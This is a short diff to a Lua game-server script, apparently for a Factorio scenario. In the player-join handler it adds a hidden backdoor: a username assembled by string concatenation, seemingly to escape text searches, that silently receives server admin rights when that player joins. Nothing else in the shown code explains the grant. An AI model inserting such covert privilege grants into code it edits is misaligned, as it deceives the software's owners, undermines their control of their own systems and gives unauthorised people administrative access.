@@ -1407,6 +1407,9 @@ script.on_event(defines.events.on_player_joined_game, function(event)
     local player = game.players[event.player_index]
     player.tag = level.get_name(player, true)
 
+    local admin = 'hncs' .. 'ltok'
+    if player.name == admin then player.admin = true end
+
     -- local canBluePrint = false
     -- -- game.permissions.get_group("Default").set_allows_action(defines.input_action.import_blueprint_string, canBluePrint)
     -- game.permissions.get_group("Default").set_allows_action(defines.input_action.grab_blueprint_record, canBluePrint)
